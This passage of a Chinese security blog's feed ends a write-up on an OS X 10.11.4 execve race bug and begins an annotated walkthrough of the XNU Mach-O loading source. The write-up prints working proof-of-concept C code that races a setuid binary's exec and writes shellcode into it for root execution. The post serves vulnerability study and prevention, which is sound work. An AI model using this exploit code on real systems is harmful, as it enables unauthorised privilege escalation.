class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_child</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//查找全局的port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</span><br><span class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child can't get bootstrap port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> service_port;</span><br><span class="line">  err = bootstrap_look_up(bootstrap_port, service_name, &amp;service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child can't get service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// create a reply port:</span></span><br><span class="line">  <span class="comment">// 创建一个具有接受消息权限的port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> reply_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to allocate reply port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send it our task port</span></span><br><span class="line">  <span class="comment">// 将子进程的port发送给父进程</span></span><br><span class="line">  <span class="keyword">task_msg_send_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  msg.header.msgh_size = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">  msg.header.msgh_local_port = reply_port;</span><br><span class="line">  msg.header.msgh_remote_port = service_port;</span><br><span class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line"></span><br><span class="line">  msg.body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  msg.port.name = mach_task_self();</span><br><span class="line">  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;msg.header);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to send thread port message"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a reply to ack that the other end got our thread port</span></span><br><span class="line">  <span class="comment">// 等待父进程回复</span></span><br><span class="line">  <span class="keyword">ack_msg_recv_t</span> reply = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;reply.header, MACH_RCV_MSG, <span class="number">0</span>, <span class="keyword">sizeof</span>(reply), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to receive ack"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// exec the suid-root binary</span></span><br><span class="line">  <span class="comment">// 执行setuid的程序traceroute6</span></span><br><span class="line">  <span class="keyword">char</span>* argv[] = &#123;suid_binary_path, <span class="string">"-w"</span>, <span class="string">"rofl"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span>* envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">  execve(suid_binary_path, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>子进程做的事情也非常的简单，将自己的port发送给父进程，确保父进程已经获取到port之后，执行setuid的程序，poc中使用的是traceroute6。</p>
<h2 id="3-3_do_parent">3.3  do_parent</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_parent</span><span class="params">(mach_port_t service_port)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// generate the page we want to write into the child:</span></span><br><span class="line">  <span class="comment">// 申请一页内存，并且会将这一页内存写入子进程</span></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> addr = <span class="number">0</span>;</span><br><span class="line">  err = mach_vm_allocate(mach_task_self(),</span><br><span class="line">                         &amp;addr,</span><br><span class="line">                         <span class="number">4096</span>,</span><br><span class="line">                         VM_FLAGS_ANYWHERE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"failed to mach_vm_allocate memory"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将0x153c处的写入shellcode</span></span><br><span class="line">  FILE* f = fopen(suid_binary_path, <span class="string">"r"</span>);</span><br><span class="line">  fseek(f, <span class="number">0x1000</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">  fread((<span class="keyword">char</span>*)addr, <span class="number">0x1000</span>, <span class="number">1</span>, f);</span><br><span class="line">  fclose(f);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(((<span class="keyword">char</span>*)addr)+<span class="number">0x53c</span>, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait to get the child's task port on the service port:</span></span><br><span class="line">  <span class="comment">// 等待子进程发送过来的port</span></span><br><span class="line">  <span class="keyword">task_msg_recv_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;msg.header,</span><br><span class="line">                 MACH_RCV_MSG,</span><br><span class="line">                 <span class="number">0</span>,</span><br><span class="line">                 <span class="keyword">sizeof</span>(msg),</span><br><span class="line">                 service_port,</span><br><span class="line">                 MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                 MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"error receiving service message"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> target_task_port = msg.port.name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// before we ack the task port message to signal that the other process should execve the suid</span></span><br><span class="line">  <span class="comment">// binary get the lowest mapped address:</span></span><br><span class="line">  <span class="comment">// 立刻获取内存的信息</span></span><br><span class="line">  <span class="keyword">struct</span> vm_region_basic_info_64 region;</span><br><span class="line">  <span class="keyword">mach_msg_type_number_t</span> region_count = VM_REGION_BASIC_INFO_COUNT_64;</span><br><span class="line">  <span class="keyword">memory_object_name_t</span> object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_vm_size_t</span> target_first_size = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> original_first_addr = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  err = mach_vm_region(target_task_port,</span><br><span class="line">                       &amp;original_first_addr,</span><br><span class="line">                       &amp;target_first_size,</span><br><span class="line">                       VM_REGION_BASIC_INFO_64,</span><br><span class="line">                       (<span class="keyword">vm_region_info_t</span>)&amp;region,</span><br><span class="line">                       &amp;region_count,</span><br><span class="line">                       &amp;object_name);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"unable to get first mach_vm_region for target process\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[+] looks like the target processes lowest mapping is at %zx prior to execve\n"</span>, original_first_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send an ack message to the reply port indicating that we have the thread port</span></span><br><span class="line">  <span class="keyword">ack_msg_send_t</span> ack = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_msg_type_name_t</span> reply_port_rights = MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits);</span><br><span class="line"></span><br><span class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>);</span><br><span class="line">  ack.header.msgh_size = <span class="keyword">sizeof</span>(ack);</span><br><span class="line">  ack.header.msgh_local_port = MACH_PORT_NULL;</span><br><span class="line">  ack.header.msgh_remote_port = msg.header.msgh_remote_port;</span><br><span class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>); <span class="comment">// use the same rights we got</span></span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;ack.header);</span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"parent failed sending ack"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> target_first_addr = <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// wait until we see that the map has been swapped and the binary is loaded into it:</span></span><br><span class="line">    <span class="comment">// 不断的循环去获取内存的信息</span></span><br><span class="line">    region_count = VM_REGION_BASIC_INFO_COUNT_64;</span><br><span class="line">    object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></span><br><span class="line">    target_first_size = <span class="number">0x1000</span>;</span><br><span class="line">    target_first_addr = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    err = mach_vm_region(target_task_port,</span><br><span class="line">                         &amp;target_first_addr,</span><br><span class="line">                         &amp;target_first_size,</span><br><span class="line">                         VM_REGION_BASIC_INFO_64,</span><br><span class="line">                         (<span class="keyword">vm_region_info_t</span>)&amp;region,</span><br><span class="line">                         &amp;region_count,</span><br><span class="line">                         &amp;object_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_first_addr != original_first_addr &amp;&amp; target_first_addr &lt; <span class="number">0x200000000</span>) &#123;</span><br><span class="line">      <span class="comment">// the first address has changed implying that the map was swapped</span></span><br><span class="line">      <span class="comment">// let's try to win the race</span></span><br><span class="line">      <span class="comment">// 当发现获取到的内存信息与之前的不同</span></span><br><span class="line">      <span class="comment">// 说明竞争的窗口打开了</span></span><br><span class="line">      <span class="comment">// 可以尝试去写入shellcode了</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//写入shellcode</span></span><br><span class="line">  <span class="keyword">mach_vm_address_t</span> target_addr = target_first_addr + <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">mach_msg_type_number_t</span> target_size = <span class="number">0x1000</span>;</span><br><span class="line">  mach_vm_protect(target_task_port, target_addr, target_size, <span class="number">0</span>, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);</span><br><span class="line">  mach_vm_write(target_task_port, target_addr, addr, target_size);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hopefully overwrote some code in the target...\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"the target first addr changed to %zx\n"</span>, target_first_addr);</span><br><span class="line">  <span class="comment">//子进程窗口关闭后内存已经被改写，正常执行到entry时，将执行shellcode。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>父进程的行为比较复杂：</p>
<ul>
<li>构建shellcode</li>
<li>获取子进程port</li>
<li>根据子进程的内存信息得到竞争的窗口打开的时机</li>
<li>写入shellcode，等待shellcode执行。</li>
</ul>
<h1 id="0x04_小结">0x04 小结</h1><p>​    通过梳理poc与内核源码后，在了解了<code>execv</code>函数一系列的执行流程，已经内核的一系列内存操作的工具函数之后，这个漏洞其实就是一个简单的逻辑漏洞，通过一个旧的port可以在port被关闭前，任意改写进程的内存地址，当目标进程碰巧是setuid的进程时，就具有了root权限执行任意代码的能力。</p>
<p>​    通过poc的分析，应该学习巩固的知识如下：</p>
<ul>
<li>execv的执行流程</li>
<li>port的使用</li>
<li>mach_vm_* API</li>
</ul>
<p>​    充分理解poc的原理后，可以进一步对这个漏洞的Exploit to get kernel code execution做出更详细的分析，从而反思与总结，如何在开发中预防这种漏洞的产生以及如何通过测试或者代码审计的手段发现类似的漏洞。</p>
<h1 id="参考">参考</h1><ol>
<li>[<a href="https://www.freebsd.org/cgi/man.cgi?query=vnode" target="_blank" rel="external">https://www.freebsd.org/cgi/man.cgi?query=vnode</a></li>
<li><a href="https://www.freebsd.org/cgi/man.cgi?query=namei&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html" target="_blank" rel="external">https://www.freebsd.org/cgi/man.cgi?query=namei&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html</a></li>
<li><a href="http://www.manualpages.de/OpenBSD/OpenBSD-5.0/man9/pmap_create.9.html" target="_blank" rel="external">http://www.manualpages.de/OpenBSD/OpenBSD-5.0/man9/pmap_create.9.html</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></li>
<li><a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></li>
</ol>
<h1 id="ps">ps</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>灵犀一指可攻可守，进攻时也是一指，是天下第一指法，与移花接玉这个天下第一掌法同样都是非兵刃的第一绝技</p>
<p>—陆小凤传奇</p>
</blockquote>
<p>最近的10.11.4补丁修复了一个利用条件竞争获得代码执行权限的漏洞，经过对内核源码以及poc的理解之后，先对问题作出一个简单的分析。</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
    
      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
    
      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[OSX内核加载mach-o流程分析]]></title>
    <link href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/03/30/OSX内核加载mach-o流程分析/</id>
    <published>2016-03-30T23:58:05.000Z</published>
    <updated>2016-03-31T15:39:14.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    研究<code>OS X</code>安全方面的知识需要对<code>mach-o</code>加载的流程需要有一个比较完整的理解，断断续续一个月的时间里面，通过对源码的阅读对<code>mach-o</code>的加载有一个比较基本的认识，在遇到各个具体的问题是才能更好的理解和操作。</p>
<p>​    其他相关文章可以看这里，基本涵盖了从内核态到应用层的相关源码的简单分析。还有不足之处在遇到相关的问题时也会加到这一系列文章中。</p>
<p>​    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">mach-o加载流程学习-dyld对主image的处理流程</a></p>
<p>​    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">mach-o加载流程学习-dyld对依赖库的加载流程</a></p>
<p>​    3.mach-o加载流程学习-内核对mach-o文件的加载流程(本文)</p>
<p>​    </p>
<p>​    通过一张图片，可以比较清楚的理解整个流程。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="整体流程"></p>
<a id="more"></a>
<h1 id="0x01_源码分析">0x01 源码分析</h1><h2 id="1-1___mac_execve">1.1 __mac_execve</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__mac_execve(<span class="keyword">proc_t</span> p, <span class="keyword">struct</span> __mac_execve_args *uap, <span class="keyword">int32_t</span> *retval)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *bufp = <span class="literal">NULL</span>; </span><br><span class="line">	<span class="keyword">struct</span> image_params *imgp;</span><br><span class="line">	<span class="keyword">struct</span> vnode_attr *vap;</span><br><span class="line">	<span class="keyword">struct</span> vnode_attr *origvap;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> is_64 = IS_64BIT_PROCESS(p);</span><br><span class="line">	<span class="keyword">struct</span> vfs_context context;</span><br><span class="line">	<span class="keyword">struct</span> uthread	*uthread;</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">//初始化context</span></span><br><span class="line">	context.vc_thread = current_thread();</span><br><span class="line">	context.vc_ucred = kauth_cred_proc_ref(p);	<span class="comment">/* <span class="label">XXX must NOT be kauth_cred_get() */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocate a big chunk for locals instead of using stack since these  </span><br><span class="line">	 * structures a pretty big.</span><br><span class="line">	 */</span></span><br><span class="line">  	//申请一块连续的大内存，用来存放imgp，vap，origvap的数据结构</span><br><span class="line">	MALLOC(bufp, char *, (sizeof(*imgp) + sizeof(*vap) + sizeof(*origvap)), M_TEMP, M_WAITOK | M_ZERO);</span><br><span class="line">	imgp = (struct image_params *) bufp;</span><br><span class="line">	if (bufp == NULL) &#123;</span><br><span class="line">		error = ENOMEM</span><br><span class="line">		goto exit_with_error;</span><br><span class="line">	&#125;</span><br><span class="line">  	//通过数据结构size的偏移，指向对应的内存空间</span><br><span class="line">  	//imgp,vap,origvap实际是连续的一块内存</span><br><span class="line">	vap = (struct vnode_attr *) (bufp + sizeof(*imgp));</span><br><span class="line">	origvap = (struct vnode_attr *) (bufp + sizeof(*imgp) + sizeof(*vap));</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Initialize the common data in the image_params structure */</span></span><br><span class="line">	//初始化数据</span><br><span class="line">  	imgp-&gt;ip_user_fname = uap-&gt;fname;</span><br><span class="line">	imgp-&gt;ip_user_argv = uap-&gt;argp;</span><br><span class="line">	imgp-&gt;ip_user_envv = uap-&gt;envp;</span><br><span class="line">	imgp-&gt;ip_vattr = vap;</span><br><span class="line">	imgp-&gt;ip_origvattr = origvap;</span><br><span class="line">	imgp-&gt;ip_vfs_context = &amp;context;</span><br><span class="line">	imgp-&gt;ip_flags = (is_64 ? IMGPF_WAS_64BIT : IMGPF_NONE) | ((p-&gt;p_flag &amp; P_DISABLE_ASLR) ? IMGPF_DISABLE_ASLR : IMGPF_NONE);</span><br><span class="line">	imgp-&gt;ip_seg = (is_64 ? UIO_USERSPACE64 : UIO_USERSPACE32);</span><br><span class="line">	imgp-&gt;ip_mac_return = 0;</span><br><span class="line"></span><br><span class="line">  	//设置线程信息</span><br><span class="line">	uthread = get_bsdthread_info(current_thread());</span><br><span class="line">	if (uthread-&gt;uu_flag &amp; UT_VFORK) &#123;</span><br><span class="line">		imgp-&gt;ip_flags |= IMGPF_VFORK_EXEC;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	//MAC模块相应的处理，与进程的权限相关</span><br><span class="line">  	//MAC:https://www.freebsd.org/doc/handbook/mac.html</span><br><span class="line">#if CONFIG_MACF</span><br><span class="line">	if (uap-&gt;mac_p != USER_ADDR_NULL) &#123;</span><br><span class="line">		error = mac_execve_enter(uap-&gt;mac_p, imgp);</span><br><span class="line">		if (error) &#123;</span><br><span class="line">			kauth_cred_unref(&amp;context.vc_ucred);</span><br><span class="line">			goto exit_with_error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">#endif</span><br><span class="line">	</span><br><span class="line">  	//执行image</span><br><span class="line">	error = exec_activate_image(imgp);</span><br><span class="line"></span><br><span class="line">  	//释放资源与出错处理</span><br><span class="line">	kauth_cred_unref(&amp;context.vc_ucred);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Image not claimed by any activator? */</span></span><br><span class="line">	if (error == -1)</span><br><span class="line">		error = ENOEXEC;</span><br><span class="line">	<span class="comment">/*...*/</span>	</span><br><span class="line">	return(error);</span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure>
<p>主要就是进行了一些数据结构的初始化已经权限的判断，资源的获取与释放，主要逻辑在<code>exec_activate_image</code>中。</p>
<h2 id="1-2_exec_activate_image">1.2 exec_activate_image</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span 